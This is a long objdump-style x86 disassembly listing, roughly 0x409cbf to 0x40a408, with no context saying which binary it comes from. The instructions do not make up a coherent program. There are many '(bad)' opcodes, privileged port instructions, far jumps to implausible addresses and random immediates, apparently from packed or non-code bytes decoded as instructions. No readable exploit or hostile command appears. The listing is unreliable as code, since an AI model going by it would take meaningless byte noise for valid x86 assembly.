  409cbf:	mov    ds:0x1bf60760,al
  409cc4:	sbb    DWORD PTR [ecx],ebp
  409cc6:	aam    0x93
  409cc8:	test   eax,0x20e0082e
  409ccd:	les    ebp,FWORD PTR [eax+0xc4dff94]
  409cd3:	cmp    esi,DWORD PTR [eax+0x75ff793b]
  409cd9:	stos   BYTE PTR es:[edi],al
  409cda:	and    eax,0x21018cd1
  409cdf:	dec    edx
  409ce0:	push   ss
  409ce1:	clc    
  409ce2:	fwait
  409ce3:	outs   dx,BYTE PTR ds:[esi]
  409ce4:	inc    esi
  409ce5:	sbb    eax,0x6004bf02
  409cea:	or     al,0x24
  409cec:	aas    
  409ced:	mov    BYTE PTR [ecx+0x70],bl
  409cf0:	in     eax,0x2a
  409cf2:	ins    BYTE PTR es:[edi],dx
  409cf3:	sbb    BYTE PTR [ecx+0x5c40e2ae],dh
  409cf9:	addr16 push eax
  409cfb:	or     bl,BYTE PTR [esi+0x60]
  409cfe:	fwait
  409cff:	mov    ch,BYTE PTR [edi+0xb]
  409d02:	pusha  
  409d03:	mov    dh,0x6a
  409d05:	call   FWORD PTR [eax]
  409d07:	xor    al,0x6b
  409d09:	and    esi,DWORD PTR [ecx+0x8]
  409d0c:	push   es
  409d0d:	add    al,0x43
  409d0f:	dec    ebp
  409d10:	fwait
  409d11:	add    al,0xf7
  409d13:	mov    al,0xdf
  409d15:	push   ebx
  409d16:	and    al,0xc0
  409d18:	in     al,dx
  409d19:	sbb    esp,ebx
  409d1b:	mov    ds:0x1def502,eax
  409d20:	sub    dh,BYTE PTR [ebx+0x27]
  409d23:	leave  
  409d24:	stos   DWORD PTR es:[edi],eax
  409d25:	dec    ebx
  409d26:	inc    eax
  409d27:	xor    BYTE PTR [edx],dl
  409d29:	cmp    BYTE PTR [edi+0x5d60e5a],dh
  409d2f:	arpl   WORD PTR [eax-0x28],ax
  409d32:	jae    0x409cb8
  409d34:	push   ss
  409d35:	cmp    BYTE PTR [eax-0x1fef9d13],0x4a
  409d3c:	mov    cl,0x3a
  409d3e:	sub    BYTE PTR [eax],dl
  409d40:	mul    BYTE PTR [ecx+0x14]
  409d43:	lock sbb edi,DWORD PTR [edi+ebx*2-0x38]
  409d48:	mov    bl,0x1
  409d4a:	cmp    eax,0x18ababe4
  409d4f:	jnp    0x409d78
  409d51:	(bad)  
  409d52:	nop
  409d53:	neg    BYTE PTR [ebx+0x54af17df]
  409d59:	or     cl,BYTE PTR [ebx-0x10]
  409d5c:	add    al,0x8a
  409d5e:	pop    esp
  409d5f:	and    al,0x34
  409d61:	push   esi
  409d62:	push   ebx
  409d63:	sahf   
  409d64:	add    esp,ebp
  409d66:	or     BYTE PTR [ebx-0x3c],dl
  409d69:	cmp    BYTE PTR [ebx],dl
  409d6b:	push   0x48
  409d6d:	fucomp st(7)
  409d6f:	out    0xf8,eax
  409d71:	xor    al,0x84
  409d73:	adc    eax,0x7df7582a
  409d78:	inc    ebx
  409d79:	cwde   
  409d7a:	adc    ecx,DWORD PTR [eax-0x2c]
  409d7d:	out    dx,al
  409d7e:	add    DWORD PTR [edx+0x7637cd54],0x2a
  409d85:	lods   al,BYTE PTR ds:[esi]
  409d86:	test   ebp,0x2c1f77db
  409d8c:	xor    BYTE PTR [ebp+0x2a],0xbe
  409d90:	pop    ss
  409d91:	sub    edx,DWORD PTR [edi+edi*4-0x78]
  409d95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d96:	add    BYTE PTR [edi+ecx*1+0x64],dh
  409d9a:	xor    bh,BYTE PTR [ebx]
  409d9c:	or     DWORD PTR [eax-0x861fae3],ecx
  409da2:	idiv   bh
  409da4:	sbb    BYTE PTR [edi],al
  409da6:	jb     0x20b32018
  409dac:	sub    BYTE PTR [edi-0x7d],0x53
  409db0:	sub    DWORD PTR [ebp+0x3d4e8362],0x20
  409db7:	dec    edi
  409db8:	fs inc ecx
  409dba:	mov    al,0xbb
  409dbc:	sub    esi,DWORD PTR [eax-0x4aaff5e0]
  409dc2:	pop    es
  409dc3:	sub    edi,eax
  409dc5:	fcomp  QWORD PTR [edx-0x68]
  409dc8:	add    eax,0xbac88a86
  409dcd:	adc    al,0x16
  409dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dd0:	sub    al,0xb7
  409dd2:	mov    bl,0x5
  409dd4:	push   ss
  409dd5:	sbb    al,0x6b
  409dd7:	fld    TBYTE PTR [eax+edi*1]
  409dda:	mov    edx,0xb8161088
  409ddf:	sub    edi,DWORD PTR [ebx-0x4fb8bee4]
  409de5:	(bad)  
  409de6:	data16 jmp 0x409e49
  409de9:	addr16 jl 0x409e4f
  409dec:	cmp    ah,ch
  409dee:	out    0xfc,eax
  409df0:	dec    edi
  409df1:	and    bl,ah
  409df3:	sub    al,0x20
  409df5:	and    esi,DWORD PTR [ecx-0x6e]
  409df8:	mov    DWORD PTR [ebx-0x79fb5700],ecx
  409dfe:	inc    esp
  409dff:	add    eax,0x2d902c3b
  409e04:	gs xor al,0xab
  409e07:	ds clc 
  409e09:	daa    
  409e0a:	jo     0x409e82
  409e0c:	pop    es
  409e0d:	sub    eax,DWORD PTR [edx]
  409e0f:	add    DWORD PTR [ebx],esi
  409e11:	sahf   
  409e12:	inc    ecx
  409e13:	sbb    eax,edx
  409e15:	jne    0x409e62
  409e17:	xor    esp,DWORD PTR [edx+0x19]
  409e1a:	rcl    BYTE PTR [esi+0x6c837fdf],1
  409e20:	jno    0x409deb
  409e22:	sub    eax,0x9eab8085
  409e27:	fsub   DWORD PTR [edx]
  409e29:	xchg   ebx,eax
  409e2a:	in     al,dx
  409e2b:	bound  eax,QWORD PTR [ecx+0x9]
  409e2e:	inc    esi
  409e2f:	and    al,0x20
  409e31:	psubw  mm3,QWORD PTR fs:[esi+0x2818286f]
  409e39:	pop    eax
  409e3a:	aam    0x9
  409e3c:	xchg   ebx,eax
  409e3d:	dec    esp
  409e3e:	xor    cl,cl
  409e40:	enter  0xd0cc,0x7c
  409e44:	das    
  409e45:	ret    0x6313
  409e48:	dec    eax
  409e4a:	jae    0x409de4
  409e4c:	das    
  409e4d:	or     esp,esp
  409e4f:	pop    ebx
  409e50:	add    eax,0x45a4b091
  409e55:	pusha  
  409e56:	mov    ecx,0x1f616212
  409e5b:	bnd jmp 0x409e12
  409e5e:	sar    BYTE PTR [ecx+0x47511434],0xf2
  409e65:	xchg   edx,eax
  409e66:	and    ebp,DWORD PTR ds:0x7b0f808c
  409e6c:	mov    BYTE PTR [edx],0x57
  409e6f:	in     eax,dx
  409e70:	sti    
  409e71:	sub    dh,BYTE PTR [eax+ebp*2+0x4b]
  409e75:	dec    eax
  409e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e77:	scas   eax,DWORD PTR es:[edi]
  409e78:	cmc    
  409e79:	es or  eax,ebp
  409e7c:	push   es
  409e7d:	loopne 0x409e95
  409e7f:	mov    dh,0x49
  409e81:	sahf   
  409e82:	in     al,dx
  409e83:	mov    BYTE PTR [edx+0x5],ch
  409e86:	or     ecx,DWORD PTR [edx+ebp*2+0x7f2d900d]
  409e8d:	cli    
  409e8e:	neg    DWORD PTR [ebp+0x68fa41d1]
  409e94:	adc    BYTE PTR [ebp+ecx*2+0x2cb966f0],dl
  409e9b:	push   edi
  409e9c:	pushf  
  409e9d:	or     eax,0x1a1f9419
  409ea2:	test   al,0xb
  409ea4:	add    DWORD PTR [edx],esi
  409ea6:	and    eax,0x1014c8db
  409eab:	int3   
  409eac:	je     0x409e73
  409eae:	out    0xd8,al
  409eb0:	rcl    BYTE PTR [eax],1
  409eb2:	sub    esp,DWORD PTR [ebx+ebp*1-0x44]
  409eb6:	inc    esi
  409eb7:	fcom   DWORD PTR [ebx]
  409eb9:	test   esp,esp
  409ebb:	test   DWORD PTR [esi+0x28],eax
  409ebe:	rcr    ebp,cl
  409ec0:	push   edi
  409ec1:	pop    edi
  409ec2:	ja     0x409ee3
  409ec4:	sar    BYTE PTR [edx+0x744be004],1
  409eca:	mov    ch,0x18
  409ecc:	adc    esp,DWORD PTR [ecx]
  409ece:	push   ebp
  409ecf:	mov    bh,BYTE PTR [ebx+ebx*4]
  409ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ed3:	and    DWORD PTR [esp+ecx*4+0x5fffff97],esi
  409eda:	ds das 
  409edc:	and    DWORD PTR [ecx],ecx
  409ede:	dec    esp
  409edf:	xchg   esp,eax
  409ee0:	cmc    
  409ee1:	cwde   
  409ee2:	frstor [ebx-0x7da1a2a6]
  409ee8:	pop    esp
  409ee9:	cli    
  409eea:	loope  0x409ef3
  409eec:	cmp    DWORD PTR [ebx],edi
  409eee:	cmp    DWORD PTR [edi-0x50],esp
  409ef1:	jle    0x409ef2
  409ef3:	(bad)  
  409ef4:	(bad)  
  409ef5:	inc    ebp
  409ef7:	ror    DWORD PTR [ebx],0x45
  409efa:	iret   
  409efb:	dec    ebp
  409efc:	or     BYTE PTR ds:0x2f1b45cf,ch
  409f02:	sub    al,ah
  409f04:	pop    edx
  409f05:	nop
  409f06:	pop    esp
  409f07:	sti    
  409f08:	or     cl,al
  409f0a:	add    bh,0x40
  409f0d:	add    DWORD PTR [eax],0x880e733d
  409f13:	cmc    
  409f14:	jno    0x409f57
  409f16:	std    
  409f17:	dec    ebp
  409f19:	div    BYTE PTR [ebx]
  409f1b:	push   es
  409f1c:	jl     0x409eff
  409f1e:	cmovs  edx,DWORD PTR [ebx+0x19]
  409f22:	ins    BYTE PTR es:[edi],dx
  409f23:	call   FWORD PTR [edx+0x4c8e1bdb]
  409f29:	jmp    FWORD PTR [ebp-0x7c]
  409f2c:	or     al,0x3b
  409f2e:	or     edi,ebx
  409f30:	(bad)  
  409f31:	(bad)  
  409f32:	mov    edi,0x3379b03f
  409f37:	mov    dl,0x7b
  409f39:	xor    eax,0x980098c
  409f3e:	test   BYTE PTR [ecx+0x13],cl
  409f41:	add    BYTE PTR [edx-0x1f],0xdd
  409f45:	pop    esp
  409f46:	ror    DWORD PTR [ecx+0x3],0xd8
  409f4a:	dec    eax
  409f4b:	int    0x4c
  409f4d:	(bad)  
  409f4e:	(bad)  
  409f4f:	(bad)  
  409f50:	call   edx
  409f52:	dec    esi
  409f53:	cmp    cl,cl
  409f55:	jecxz  0x409f86
  409f57:	mov    fs,ebp
  409f59:	das    
  409f5a:	xchg   edx,eax
  409f5b:	in     eax,dx
  409f5c:	push   edx
  409f5d:	sub    dl,BYTE PTR ds:0x5e85ea57
  409f63:	dec    edx
  409f64:	mov    ebx,0x62b9de63
  409f69:	inc    edx
  409f6a:	mov    bh,0x67
  409f6c:	fidivr WORD PTR [ebp-0xce358d]
  409f72:	jg     0x409f15
  409f74:	dec    DWORD PTR [ebx-0x1a]
  409f77:	cdq    
  409f78:	inc    edx
  409f79:	push   cs
  409f7a:	pop    esp
  409f7b:	xchg   edi,eax
  409f7c:	shr    BYTE PTR [ebp+esi*4-0x2b],0x53
  409f81:	repnz adc dl,BYTE PTR [edx]
  409f84:	push   cs
  409f85:	push   cs
  409f86:	stc    
  409f87:	or     dl,BYTE PTR [esi+0x75]
  409f8a:	jp     0x45c9c85
  409f90:	lock xor edx,DWORD PTR [esi-0x7abd684d]
  409f97:	jns    0x409fb7
  409f99:	adc    DWORD PTR [ebx-0x12],esp
  409f9c:	cwde   
  409f9d:	(bad)  
  409f9e:	(bad)  
  409f9f:	call   FWORD PTR [ebx+0x6d]
  409fa2:	push   ebx
  409fa3:	iret   
  409fa4:	sub    bl,BYTE PTR [si+0x115c]
  409fa9:	xor    al,0x43
  409fab:	in     al,dx
  409fac:	inc    edi
  409fad:	add    bh,BYTE PTR [esp+edi*2-0x128cfbcb]
  409fb4:	inc    edi
  409fb5:	sbb    bh,BYTE PTR [ebp+0x5b0d1662]
  409fbb:	jmp    FWORD PTR [edi]
  409fbd:	cld    
  409fbe:	(bad)  
  409fbf:	jmp    0x1ddb:0x11f25b99
  409fc6:	iret   
  409fc7:	je     0x409f62
  409fc9:	add    al,0x70
  409fcb:	xchg   ecx,eax
  409fcc:	rcr    BYTE PTR [ebp+0x26627b21],1
  409fd2:	cdq    
  409fd3:	pusha  
  409fd4:	(bad)  
  409fd5:	mov    cl,0xa0
  409fd7:	test   DWORD PTR [ebx-0x1],esp
  409fda:	(bad)  
  409fdb:	(bad)  
  409fdc:	jmp    DWORD PTR [eax-0x5d]
  409fdf:	mov    al,ds:0xd3582c1d
  409fe4:	mov    esp,0x3bd0d542
  409fe9:	sar    BYTE PTR [eax-0x21],0x7f
  409fed:	inc    edx
  409fee:	xchg   esi,eax
  409fef:	in     eax,dx
  409ff0:	push   0x50ed4181
  409ff5:	mov    eax,0xb658dd79
  409ffa:	imul   ebx,ebp,0xffdbfb50
  40a000:	(bad)  
  40a001:	mov    ebp,0xc728ad60
  40a006:	pop    ds
  40a007:	lods   eax,DWORD PTR ds:[esi]
  40a008:	xor    ah,bl
  40a00a:	adc    al,0xbd
  40a00c:	cmp    bl,dl
  40a00e:	adc    DWORD PTR [ebp+0xf34da30],edi
  40a014:	fild   WORD PTR [edx]
  40a016:	lods   eax,DWORD PTR ds:[esi]
  40a017:	push   eax
  40a018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a019:	jbe    0x40a03a
  40a01b:	(bad)  
  40a01c:	(bad)  
  40a01d:	in     eax,dx
  40a01e:	jb     0x409fd9
  40a020:	dec    ebx
  40a021:	mov    al,0x7c
  40a023:	das    
  40a024:	popf   
  40a025:	sub    eax,0xb6cb6828
  40a02a:	clc    
  40a02b:	aas    
  40a02c:	mov    esp,0x72b837fe
  40a031:	xchg   ebx,eax
  40a032:	jnp    0x409fda
  40a034:	(bad)  
  40a035:	call   DWORD PTR [edi+0x7bd56afe]
  40a03b:	jmp    0x7319:0x2492f542
  40a042:	adc    eax,0xf3787807
  40a047:	cmp    eax,0x3868f38c
  40a04c:	add    ch,BYTE PTR [eax-0x69]
  40a04f:	mov    esi,0xffff98e3
  40a054:	(bad)  
  40a055:	call   ebx
  40a057:	sbb    eax,0xdd48d3ac
  40a05c:	mov    dl,BYTE PTR [eax+0x4]
  40a05f:	popw   ss
  40a061:	in     al,0xb6
  40a063:	aaa    
  40a064:	mov    ah,0x30
  40a066:	and    ch,BYTE PTR [ecx+0x51a7256c]
  40a06c:	fsub   DWORD PTR [ebx]
  40a06e:	mov    ebp,DWORD PTR [ebx+0x20]
  40a071:	sub    ebp,DWORD PTR [edx-0xdd0e5e0]
  40a077:	mov    bh,0xff
  40a079:	jmp    FWORD PTR [ebx+0x2f6268ec]
  40a07f:	sub    al,0x26
  40a081:	sbb    DWORD PTR [edi+0x3fa321a2],eax
  40a087:	mov    edx,0x716b439
  40a08c:	lods   eax,DWORD PTR ds:[esi]
  40a08d:	or     DWORD PTR [edx-0x44fa59d7],ebp
  40a093:	pop    edi
  40a094:	(bad)  
  40a095:	jmp    FWORD PTR [edi-0x2fa62598]
  40a09b:	inc    ecx
  40a09c:	loop   0x40a0ff
  40a09e:	jmp    0xe2aa8b1b
  40a0a3:	dec    esp
  40a0a4:	jmp    0x40a0f4
  40a0a6:	cli    
  40a0a7:	jns    0x40a095
  40a0a9:	pmaddwd mm1,QWORD PTR [ebp-0x4a]
  40a0ad:	mov    edi,0x40fe2e5d
  40a0b2:	neg    DWORD PTR [edi+ebx*1]
  40a0b5:	ret    0xb720
  40a0b8:	lds    ebx,FWORD PTR ss:[esi]
  40a0bb:	add    eax,esp
  40a0bd:	das    
  40a0be:	mov    bh,0xcb
  40a0c0:	outs   dx,DWORD PTR ds:[esi]
  40a0c1:	(bad)  
  40a0c2:	sbb    edx,DWORD PTR [edi-0x16ee19ea]
  40a0c8:	xor    BYTE PTR [edi],al
  40a0ca:	call   0xfbb13ff4
  40a0cf:	cld    
  40a0d0:	jmp    ebp
  40a0d2:	(bad)  
  40a0d3:	jp     0x40a05b
  40a0d5:	dec    edx
  40a0d6:	jecxz  0x40a13a
  40a0d8:	cdq    
  40a0d9:	dec    ebp
  40a0da:	jmp    0x40a146
  40a0dc:	nop
  40a0dd:	inc    esp
  40a0de:	fwait
  40a0df:	dec    edi
  40a0e0:	fwait
  40a0e1:	sbb    ah,dl
  40a0e3:	push   es
  40a0e4:	mov    ds:0xab2ca522,eax
  40a0e9:	sub    ch,BYTE PTR [ecx+eax*1-0x4089a341]
  40a0f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f1:	or     DWORD PTR [ebx-0x5ef041c6],edi
  40a0f7:	add    BYTE PTR [eax-0x2f9c5ce9],ch
  40a0fd:	sbb    bl,BYTE PTR [edx-0x92b5]
  40a103:	jae    0x40a0b3
  40a105:	(bad)  
  40a106:	fnsave [ebx-0x2e]
  40a109:	jp     0x40a0d8
  40a10b:	stos   BYTE PTR es:[edi],al
  40a10c:	out    0xaa,al
  40a10e:	pusha  
  40a10f:	nop
  40a110:	ins    DWORD PTR es:[edi],dx
  40a111:	mov    ah,0x78
  40a113:	rcr    eax,cl
  40a115:	int3   
  40a116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a117:	outs   dx,DWORD PTR ds:[esi]
  40a118:	cld    
  40a119:	(bad)  
  40a11a:	jmp    FWORD PTR [edx-0x7]
  40a11d:	test   al,0x60
  40a11f:	shr    DWORD PTR [esi+0x3698cb5e],cl
  40a125:	imul   esi,DWORD PTR [ecx+ecx*2],0xffffffba
  40a129:	repz ss jnp 0x40a11e
  40a12d:	or     eax,DWORD PTR [edx+0x1b76e545]
  40a133:	jns    0x40a0d4
  40a135:	(bad)  
  40a136:	(bad)  
  40a137:	(bad)  
  40a138:	(bad)  
  40a139:	fcom   QWORD PTR [esi+0x5c]
  40a13c:	add    DWORD PTR [ebp-0x6b],esi
  40a13f:	rcr    BYTE PTR [edx+0x50],cl
  40a142:	or     al,BYTE PTR [eax]
  40a144:	cmp    ebp,DWORD PTR [eax+0x6ae27bc7]
  40a14a:	pop    esp
  40a14b:	ss inc eax
  40a14d:	sub    bh,BYTE PTR [eax+0x44]
  40a150:	sub    al,BYTE PTR [eax+0x56]
  40a153:	test   eax,0xea13089
  40a158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a159:	(bad)  
  40a15a:	(bad)  
  40a15b:	inc    DWORD PTR [edx]
  40a15d:	xchg   ebp,eax
  40a15e:	or     DWORD PTR [ecx+esi*1],esi
  40a161:	in     eax,0x8b
  40a163:	aaa    
  40a164:	test   eax,0x91139e6
  40a169:	cmp    al,0x2f
  40a16b:	and    BYTE PTR [eax],bh
  40a16d:	aas    
  40a16e:	and    eax,0x1d083f23
  40a173:	add    eax,DWORD PTR [edi]
  40a175:	(bad)  
  40a176:	(bad)  
  40a177:	(bad)  
  40a178:	jmp    DWORD PTR [eax]
  40a17a:	pop    ss
  40a17b:	and    cl,BYTE PTR [eax]
  40a17d:	sbb    DWORD PTR [ecx],edi
  40a17f:	and    BYTE PTR ss:[edx],dl
  40a182:	sub    al,0x47
  40a184:	imul   ecx,DWORD PTR [ebx+eiz*2+0x67],0x4c607e53
  40a18c:	pop    esi
  40a18d:	data16 jl 0x40a1f0
  40a190:	pop    eax
  40a191:	arpl   WORD PTR [edi+0x5e],si
  40a194:	imul   ebp,DWORD PTR [eax+0x6b],0x6c
  40a198:	add    dh,bh
  40a19a:	(bad)  
  40a19b:	(bad)  
  40a19c:	push   DWORD PTR [edx]
  40a19e:	or     eax,0x373a041c
  40a1a3:	and    DWORD PTR [eax],esp
  40a1a5:	adc    eax,0x1a0e1009
  40a1aa:	xor    bh,BYTE PTR [ebx+ecx*1]
  40a1ad:	or     esp,DWORD PTR [ebp+0x79]
  40a1b0:	cmp    al,0x4b
  40a1b2:	inc    ebx
  40a1b3:	inc    ebp
  40a1b4:	jge    0x40a208
  40a1b6:	inc    ebx
  40a1b7:	pop    ebp
  40a1b8:	add    eax,0xffffff07
  40a1bd:	jg     0x40a191
  40a1bf:	push   cs
  40a1c0:	pop    ss
  40a1c1:	dec    esp
  40a1c2:	jmp    0x40a1f9
  40a1c4:	mov    al,ds:0x7dd6645a
  40a1c9:	push   es
  40a1ca:	aaa    
  40a1cb:	push   0x62
  40a1cd:	and    DWORD PTR [ebx+0x11],esi
  40a1d0:	mov    bh,0x4a
  40a1d2:	xor    esp,DWORD PTR [ebp-0x38]
  40a1d5:	xchg   ecx,eax
  40a1d6:	das    
  40a1d7:	sbb    dh,BYTE PTR [edi]
  40a1d9:	push   0xfffffff3
  40a1db:	mov    ch,BYTE PTR [edi-0x1]
  40a1de:	(bad)  
  40a1df:	(bad)  
  40a1e0:	jmp    FWORD PTR [ecx+0x2a]
  40a1e3:	cld    
  40a1e4:	shl    DWORD PTR [edi],cl
  40a1e6:	push   esi
  40a1e7:	test   al,0x54
  40a1e9:	mov    bh,0x96
  40a1eb:	pop    ebx
  40a1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1ed:	mov    bh,0x56
  40a1ef:	or     ch,BYTE PTR [esi]
  40a1f1:	mov    ds:0xa1ea18b3,al
  40a1f6:	jl     0x40a224
  40a1f8:	jnp    0x40a1d4
  40a1fa:	repz aad 0xc8
  40a1fd:	xchg   esp,eax
  40a1fe:	out    dx,eax
  40a1ff:	or     bh,BYTE PTR [edi-0x1]
  40a202:	(bad)  
  40a203:	(bad)  
  40a204:	dec    DWORD PTR [ecx-0x16]
  40a207:	dec    esp
  40a208:	jae    0x40a234
  40a20a:	add    esi,ebp
  40a20c:	push   esi
  40a20d:	les    esi,FWORD PTR [ebx]
  40a20f:	jp     0x40a28b
  40a211:	mov    ebp,0xcf183154
  40a216:	mov    ds:0xac49fc3c,al
  40a21b:	sahf   
  40a21c:	push   cs
  40a21d:	test   BYTE PTR [ebx],dl
  40a21f:	dec    ebp
  40a220:	push   ebx
  40a221:	outs   dx,BYTE PTR ds:[esi]
  40a222:	mov    esp,0xffff213f
  40a227:	(bad)  
  40a228:	(bad)  
  40a229:	cmp    BYTE PTR [ebx],bl
  40a22b:	cmp    eax,0x8f2aefa5
  40a230:	xor    ecx,edi
  40a232:	out    0x10,al
  40a234:	fist   DWORD PTR [ecx-0x60]
  40a237:	xchg   BYTE PTR [edi-0x42],bl
  40a23a:	leave  
  40a23b:	ins    DWORD PTR es:[edi],dx
  40a23c:	test   eax,0x632b6201
  40a241:	push   ds
  40a242:	leave  
  40a243:	cs sub ecx,ebp
  40a246:	adc    bl,BYTE PTR [ebx]
  40a248:	and    edi,edi
  40a24a:	(bad)  
  40a24b:	(bad)  
  40a24c:	push   DWORD PTR [edx-0x3b]
  40a24f:	mov    ds:0x5a372565,eax
  40a254:	push   esp
  40a255:	pop    ebx
  40a256:	cmp    eax,0x2fe14f9c
  40a25b:	mov    ds:0x83f28b67,eax
  40a260:	test   al,0x9e
  40a262:	pop    edi
  40a263:	clc    
  40a264:	push   edi
  40a265:	repz into 
  40a267:	fsubr  st(7),st
  40a269:	cmp    eax,0xffd31ff4
  40a26e:	(bad)  
  40a26f:	(bad)  
  40a270:	dec    DWORD PTR [eax]
  40a272:	imul   ebp,DWORD PTR [eax],0x23e8dbf6
  40a278:	not    bl
  40a27a:	mov    BYTE PTR [ebx],bl
  40a27c:	jne    0x40a242
  40a27e:	and    DWORD PTR [ebp-0x36939c68],eax
  40a284:	lock dec ebp
  40a286:	jge    0x40a24e
  40a288:	aad    0xf6
  40a28a:	mov    bl,0x36
  40a28c:	or     BYTE PTR [esp+edx*2],ah
  40a28f:	shl    DWORD PTR [eax-0x1],0xff
  40a293:	(bad)  
  40a294:	dec    DWORD PTR [ebx-0x6557a659]
  40a29a:	inc    eax
  40a29b:	icebp  
  40a29c:	pusha  
  40a29d:	cmp    eax,ebp
  40a29f:	jns    0x40a2c9
  40a2a1:	enter  0xe11d,0xd0
  40a2a5:	popa   
  40a2a6:	push   esi
  40a2a7:	xor    BYTE PTR [esi+0x4af2a78c],dl
  40a2ad:	push   esp
  40a2ae:	ss nop
  40a2b0:	test   al,0x9d
  40a2b2:	js     0x40a2ef
  40a2b4:	mov    esi,0xfffffff2
  40a2b9:	and    al,0xb6
  40a2bb:	mov    ebp,DWORD PTR [edi+0x2e88304e]
  40a2c1:	push   esp
  40a2c2:	leave  
  40a2c3:	cmp    DWORD PTR [eax],ebp
  40a2c5:	push   ebp
  40a2c6:	fidivr WORD PTR [eax+0x1e]
  40a2c9:	xchg   esp,eax
  40a2ca:	das    
  40a2cb:	jp     0x40a28f
  40a2cd:	enter  0x84e2,0x8e
  40a2d1:	cdq    
  40a2d2:	and    al,0xe3
  40a2d4:	mov    ds:0xfff9685e,al
  40a2d9:	(bad)  
  40a2da:	jmp    0x40a2a6
  40a2dc:	add    BYTE PTR [edx+eiz*8+0x2cfd4dc8],al
  40a2e3:	pop    ebp
  40a2e4:	bound  esi,QWORD PTR [ebx+0x75]
  40a2e7:	dec    esi
  40a2e8:	jo     0x40a34c
  40a2ea:	(bad)  
  40a2eb:	jg     0x40a276
  40a2ed:	add    BYTE PTR [eax+0x64],ch
  40a2f0:	pop    edi
  40a2f1:	bound  eax,QWORD PTR [eax+0x22]
  40a2f4:	sbb    eax,DWORD PTR ss:[edx-0x7c]
  40a2f8:	add    al,0xa2
  40a2fa:	xor    ah,al
  40a2fc:	dec    ebp
  40a2fd:	jg     0x40a2fa
  40a2ff:	(bad)  
  40a300:	(bad)  
  40a301:	jl     0x40a2a4
  40a303:	and    al,BYTE PTR [edx+eiz*1-0x2f6410ae]
  40a30a:	fnsave [ecx+0x37d92e19]
  40a310:	xchg   edx,eax
  40a311:	out    0xdd,al
  40a313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a314:	mov    esi,0x6b78b2c7
  40a319:	aad    0xd1
  40a31b:	mov    ecx,0xffffff1d
  40a320:	inc    DWORD PTR [esi]
  40a322:	push   0x91fdee3b
  40a327:	sub    DWORD PTR [edi],esp
  40a329:	adc    al,0xf7
  40a32b:	mov    edi,0x2b31ddf5
  40a330:	xor    al,0xd7
  40a332:	lods   al,BYTE PTR ds:[esi]
  40a333:	adc    DWORD PTR [ebp-0x7cafa823],esi
  40a339:	fst    DWORD PTR [ecx-0xf]
  40a33c:	push   ebp
  40a33d:	jne    0x40a397
  40a33f:	jecxz  0x40a36b
  40a341:	sbb    edx,DWORD PTR [ecx+0x6c]
  40a344:	std    
  40a345:	dec    ebp
  40a346:	shl    DWORD PTR [ecx+0x6b],1
  40a349:	je     0x40a322
  40a34b:	add    eax,DWORD PTR [ecx+0x6d]
  40a34e:	inc    ebx
  40a34f:	(bad)  
  40a350:	in     eax,dx
  40a351:	call   DWORD PTR [esi]
  40a353:	mov    ds:0x44da7169,al
  40a358:	mov    bh,0xf9
  40a35a:	in     eax,0xbd
  40a35c:	pop    ecx
  40a35d:	xlat   BYTE PTR ds:[ebx]
  40a35e:	push   es
  40a35f:	retf   0xe5c9
  40a362:	lea    ebx,[edi-0xf245478]
  40a368:	(bad)  
  40a369:	(bad)  
  40a36a:	(bad)  
  40a36b:	jmp    0xf0c84939
  40a370:	fisttp DWORD PTR [eax]
  40a372:	popf   
  40a373:	stc    
  40a374:	leave  
  40a375:	es aam 0xa7
  40a378:	(bad)  
  40a379:	rol    BYTE PTR [edi+esi*8+0x6f],cl
  40a37d:	cmp    BYTE PTR [edi+0x42],dl
  40a380:	push   ebx
  40a381:	stos   BYTE PTR es:[edi],al
  40a382:	daa    
  40a383:	cli    
  40a384:	jb     0x40a3e5
  40a386:	(bad)  
  40a387:	(bad)  
  40a388:	(bad)  
  40a389:	(bad)  
  40a38a:	mov    edi,0x1a57c71e
  40a38f:	add    al,0x62
  40a391:	xlat   BYTE PTR ds:[ebx]
  40a392:	inc    edx
  40a393:	xlat   BYTE PTR ds:[ebx]
  40a394:	in     eax,dx
  40a395:	addr16 mov edx,0x12e70d96
  40a39b:	sbb    edx,edi
  40a39d:	ja     0x40a379
  40a39f:	dec    eax
  40a3a0:	jge    0x40a339
  40a3a2:	or     BYTE PTR [ebx+0x7a3a6702],0x3a
  40a3a9:	(bad)  
  40a3aa:	(bad)  
  40a3ab:	jmp    FWORD PTR [edi+0x1f]
  40a3ae:	std    
  40a3af:	cmp    ebp,DWORD PTR [edx+ebx*8-0x3f]
  40a3b3:	sbb    edx,edx
  40a3b5:	add    dh,BYTE PTR ds:0xa96aee5b
  40a3bb:	shl    BYTE PTR [edi+0x7ec0bc8a],cl
  40a3c1:	les    esp,FWORD PTR [esi+0x67429c5b]
  40a3c7:	fwait
  40a3c8:	out    dx,al
  40a3c9:	clc    
  40a3ca:	fbld   TBYTE PTR [eax-0x55]
  40a3cd:	sbb    DWORD PTR [ebx+0x78],ebx
  40a3d0:	loopne 0x40a43a
  40a3d2:	inc    ebx
  40a3d3:	push   cs
  40a3d4:	adc    BYTE PTR [ebx+ecx*8+0x5e],bl
  40a3d8:	(bad)  
  40a3da:	outs   dx,DWORD PTR ds:[esi]
  40a3db:	std    
  40a3dc:	mov    edi,0x39291dd
  40a3e1:	loopne 0x40a408
  40a3e3:	rol    BYTE PTR [ebx-0x12],cl
  40a3e6:	ins    BYTE PTR es:[edi],dx
  40a3e7:	inc    esp
  40a3e8:	stos   DWORD PTR es:[edi],eax
  40a3e9:	mov    esi,0xe53dbb7
  40a3ee:	(bad)  
  40a3ef:	retf   
  40a3f0:	jle    0x40a3f1
  40a3f2:	(bad)  
  40a3f3:	(bad)  
  40a3f4:	jmp    ecx
  40a3f6:	mov    bl,0x2e
  40a3f8:	fstp   st(5)
  40a3fa:	and    eax,0x588e0d9e
  40a3ff:	cs jge 0x40a481
  40a402:	and    DWORD PTR [esi+0x6ed290cd],edi
  40a408:	fst    QWORD PTR [ecx+0x64]
